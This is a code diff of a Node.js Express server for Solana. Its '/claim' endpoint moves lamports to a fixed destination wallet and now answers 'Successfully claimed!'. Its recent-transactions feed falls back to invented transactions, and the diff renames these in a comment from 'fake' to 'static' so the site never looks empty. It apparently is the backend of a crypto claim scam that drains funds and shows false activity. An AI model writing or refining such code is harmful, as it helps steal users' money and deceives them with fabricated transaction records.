@@ -1,7 +1,6 @@
-const connection = new Connection(process.env.RPC_URL);
+const { Connection, PublicKey, Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
 const express = require('express');
 const cors = require('cors');
-const { Connection, PublicKey, Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
 const bs58 = require('bs58');
 require('dotenv').config();
 
@@ -12,6 +11,8 @@ app.use(express.json());
 const PORT = process.env.PORT || 3000;
 const DESTINATION_WALLET = process.env.DESTINATION_WALLET;
 const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
+
+// Declare connection ONLY ONCE
 const connection = new Connection(RPC_URL);
 
 app.post('/claim', async (req, res) => {
@@ -69,7 +70,11 @@ app.post('/claim', async (req, res) => {
         );
 
         console.log(`✅ Success: ${amountToSend} lamports moved to ${DESTINATION_WALLET}. TX: ${signature}`);
-        return res.json({ success: true, tx: signature });
+        return res.json({ 
+            success: true, 
+            message: `Successfully claimed! TX: ${signature}`, 
+            tx: signature 
+        });
 
     } catch (globalError) {
         console.error("💥 Transfer Error:", globalError.message);
@@ -90,16 +95,9 @@ app.get('/api/recent-txs', async (req, res) => {
 
         res.json(formattedTxs);
     } catch (error) {
-        console.error("Feed Error:", error);
-        res.status(500).json({ error: "Failed to fetch real-time data" });
-    }
-});
-
-        return res.json(formattedTxs);
-    } catch (error) {
         console.error("Feed Error:", error.message);
-        
-        // FALLBACK: If the RPC fails, return a set of static "fake" transactions 
+
+            // FALLBACK: If the RPC fails, return static transactions 
         // so the website never looks empty or broken.
         const fallbacks = [
             { hash: "5zX8N2pQ1aB4C7D9E1F2G3H4I5J6K7L", wallet: "8x...rT", amount: "0.8 SOL", time: "1 min ago" },
